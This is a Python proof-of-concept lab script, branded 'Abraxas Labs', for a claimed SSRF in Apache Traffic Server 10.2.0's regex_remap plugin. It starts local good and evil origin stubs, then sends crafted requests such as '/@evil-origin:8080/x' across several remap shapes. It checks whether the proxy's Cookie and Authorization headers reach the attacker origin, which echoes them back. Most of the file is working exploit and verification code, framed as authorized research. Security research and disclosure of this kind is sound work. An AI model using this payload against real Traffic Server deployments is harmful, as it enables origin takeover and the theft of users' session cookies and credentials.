#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: ats-regex-remap-userinfo (High: 8.6)
#  Vendor: Apache Traffic Server (ASF)
#  Versions: Apache Traffic Server 10.2.0 (b1df7334)
#  Impact: regex_remap noslash $n userinfo SSRF with Cookie and Authorization forwarded
#  Requires: regex_remap plugin; map http://origin:port$1
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "ats-regex-remap-userinfo"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only lab: ATS 10.2.0 regex_remap $n userinfo origin takeover."""


import argparse
import socket
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LABEL = "ats-regex-remap-userinfo"
WITNESS = "ATS-REGEX-REMAP-USERINFO-WITNESS"
GOOD_BODY = "GOOD"
ATS_HOST = "127.0.0.1"
ATS_PORT = 18730
EVIL_PUBLISH_PORT = 18731
ORIGIN_PORT = 8080
COOKIE_VALUE = f"lab={WITNESS}"
AUTH_VALUE = "Bearer lab-ats-uid"
POC_PATH = "/@evil-origin:8080/x"
CONTROL_PATH = "/ok"
SLASH_VHOST = "lab-slash.example"
NOSLASH_VHOST = "lab-noslash.example"
DOLLAR_VHOST = "lab-dollar.example"
CONNECT_TIMEOUT = 8.0
READ_LIMIT = 65536


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    raise SystemExit(0)


def sanitize(text: str) -> str:
    return text.replace("\n", " ").replace("\r", " ")[:320]


class OriginServer(ThreadingHTTPServer):
    allow_reuse_address = True


class OriginHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    role = "good"

    def log_message(self, fmt: str, *args: object) -> None:
        log(f"origin-{self.role} " + (fmt % args))

    def _read_body(self) -> bytes:
        length = int(self.headers.get("Content-Length") or 0)
        if length <= 0:
            return b""
        return self.rfile.read(length)

    def _reply(self, status: int, body: str, extra: dict[str, str] | None = None) -> None:
        payload = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Connection", "close")
        self.send_header("Cache-Control", "no-store")
        if extra:
            for key, value in extra.items():
                self.send_header(key, value)
        self.end_headers()
        self.wfile.write(payload)

    def _handle(self) -> None:
        path = self.path.split("?", 1)[0]
        if path == "/health":
            self._reply(200, "ok\n")
            return
        cookie = self.headers.get("Cookie", "")
        authorization = self.headers.get("Authorization", "")
        host = self.headers.get("Host", "")
        if self.role == "good":
            log(f"IOC good-hit path={path} host={host}")
            self._reply(200, f"{GOOD_BODY}\n", {"X-Origin": "good"})
            return
        log(
            "IOC evil-hit "
            f"path={path} host={host} cookie={sanitize(cookie)} "
            f"authorization={sanitize(authorization)} {WITNESS}"
        )
        body = (
            f"{WITNESS}\n"
            f"origin=evil\n"
            f"path={path}\n"
            f"host={host}\n"
            f"cookie={cookie}\n"
            f"authorization={authorization}\n"
        )
        self._reply(
            200,
            body,
            {
                "X-Origin": "evil",
                "X-Echo-Cookie": cookie,
                "X-Echo-Authorization": authorization,
            },
        )

    def do_GET(self) -> None:
        self._handle()

    def do_HEAD(self) -> None:
        self._handle()

    def do_POST(self) -> None:
        self._read_body()
        self._handle()


def run_origin(role: str) -> int:
    OriginHandler.role = role
    log(f"origin-listen role={role} port={ORIGIN_PORT}")
    httpd = OriginServer(("0.0.0.0", ORIGIN_PORT), OriginHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        return 0
    return 0


def raw_http(
    connect_host: str,
    connect_port: int,
    *,
    method: str,
    path: str,
    host: str,
    headers: dict[str, str] | None = None,
    timeout: float = CONNECT_TIMEOUT,
) -> tuple[int, dict[str, str], str]:
    hdrs = {
        "Host": host,
        "Connection": "close",
        "User-Agent": "ats-regex-remap-userinfo-lab",
    }
    if headers:
        hdrs.update(headers)
    lines = [f"{method} {path} HTTP/1.1"]
    lines.extend(f"{key}: {value}" for key, value in hdrs.items())
    lines.append("")
    lines.append("")
    payload = "\r\n".join(lines).encode("ascii")
    try:
        with socket.create_connection((connect_host, connect_port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(payload)
            chunks: list[bytes] = []
            received = 0
            while received < READ_LIMIT:
                data = sock.recv(4096)
                if not data:
                    break
                chunks.append(data)
                received += len(data)
    except OSError as exc:
        return 0, {}, sanitize(str(exc))
    raw = b"".join(chunks)
    try:
        head, _, body_raw = raw.partition(b"\r\n\r\n")
        if not head:
            head, _, body_raw = raw.partition(b"\n\n")
        text = head.decode("iso-8859-1", "replace")
        status_line, *header_lines = text.split("\r\n") if "\r\n" in text else text.split("\n")
        parts = status_line.split()
        status = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
        parsed: dict[str, str] = {}
        for line in header_lines:
            if ":" not in line:
                continue
            key, value = line.split(":", 1)
            parsed[key.strip().lower()] = value.strip()
        body = body_raw.decode("utf-8", "replace")
        return status, parsed, body
    except (ValueError, IndexError) as exc:
        return 0, {}, sanitize(str(exc) + " " + raw[:200].decode("utf-8", "replace"))


def wait_ats() -> None:
    last = "none"
    for attempt in range(1, 91):
        status, _, body = raw_http(
            ATS_HOST,
            ATS_PORT,
            method="GET",
            path=CONTROL_PATH,
            host=SLASH_VHOST,
        )
        last = f"{status} {sanitize(body)}"
        if status == 200 and GOOD_BODY in body and WITNESS not in body:
            log(f"IOC ats-ready attempt={attempt} control=/ok host={SLASH_VHOST} {last}")
            return
        log(f"IOC ats-wait attempt={attempt} last={last}")
        time.sleep(2)
    fail(f"ats not ready on {ATS_HOST}:{ATS_PORT} last={last}")


def probe(
    name: str,
    path: str,
    host: str,
    *,
    cookie: bool = False,
) -> tuple[int, str]:
    headers: dict[str, str] = {}
    if cookie:
        headers["Cookie"] = COOKIE_VALUE
        headers["Authorization"] = AUTH_VALUE
    status, hdrs, body = raw_http(
        ATS_HOST,
        ATS_PORT,
        method="GET",
        path=path,
        host=host,
        headers=headers,
    )
    origin = hdrs.get("x-origin", "")
    log(
        f"IOC {name} path={path} host={host} status={status} "
        f"x-origin={origin} body={sanitize(body)}"
    )
    return status, body


def hit_is_evil(body: str) -> bool:
    return WITNESS in body and "origin=evil" in body


def hit_is_good(body: str) -> bool:
    return GOOD_BODY in body and WITNESS not in body


def main() -> int:
    parser = argparse.ArgumentParser(description="ATS regex_remap userinfo SSRF lab")
    parser.add_argument("--role", choices=("good", "evil"), help="run an origin stub")
    args = parser.parse_args()
    if args.role:
        return run_origin(args.role)

    log(
        f"lab {LABEL} ats={ATS_HOST}:{ATS_PORT} path={POC_PATH} "
        f"witness={WITNESS}"
    )

    evil_status, _, evil_body = raw_http(
        ATS_HOST,
        EVIL_PUBLISH_PORT,
        method="GET",
        path="/x",
        host="evil-origin:8080",
    )
    log(f"IOC evil-direct status={evil_status} body={sanitize(evil_body)}")
    if evil_status != 200 or WITNESS not in evil_body:
        fail(f"evil-origin not serving witness status={evil_status}")

    wait_ats()

    control_status, control_body = probe("control-slash", CONTROL_PATH, SLASH_VHOST)
    if not hit_is_good(control_body):
        fail(
            "CONTROL GET /ok did not stay on good-origin "
            f"status={control_status} body={sanitize(control_body)}"
        )
    log("IOC control-slash stayed on good-origin")

    shapes: list[tuple[str, str, str]] = [
        ("slash", POC_PATH, SLASH_VHOST),
        ("noslash", POC_PATH, NOSLASH_VHOST),
        ("dollar-at", POC_PATH, DOLLAR_VHOST),
        ("dollar-host", "/evil-origin:8080/x", DOLLAR_VHOST),
    ]
    results: dict[str, str] = {}
    winner = ""
    winner_body = ""
    for name, path, host in shapes:
        status, body = probe(f"poc-{name}", path, host, cookie=True)
        if hit_is_evil(body):
            results[name] = "evil"
            if not winner:
                winner = name
                winner_body = body
        elif hit_is_good(body):
            results[name] = "good"
        else:
            results[name] = f"other:{status}:{sanitize(body)}"
        log(f"IOC shape-{name} result={results[name]}")

    if results.get("slash") == "good":
        log(
            "IOC slash-shape stayed on good-origin "
            "(authority ends at /; documented http://origin/$1 is path, not userinfo)"
        )

    if not winner:
        fail(
            "no evil-origin body; leftover did not take over origin "
            f"results={results}"
        )

    cookie_fwd = COOKIE_VALUE in winner_body
    auth_fwd = AUTH_VALUE in winner_body
    log(f"IOC forward cookie={cookie_fwd} authorization={auth_fwd}")
    if winner == "slash":
        leftover = "documented-slash http://good-origin:8080/$1"
    elif winner == "noslash":
        leftover = "noslash http://good-origin:8080$1 (userinfo=good-origin:8080 host=evil-origin)"
    else:
        leftover = f"{winner} http://$1"

    success(
        f"shape={winner} leftover={leftover} "
        f"slash={results.get('slash')} noslash={results.get('noslash')} "
        f"dollar-at={results.get('dollar-at')} dollar-host={results.get('dollar-host')} "
        f"cookie-fwd={cookie_fwd} authorization-fwd={auth_fwd} "
        f"control=/ok"
    )
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

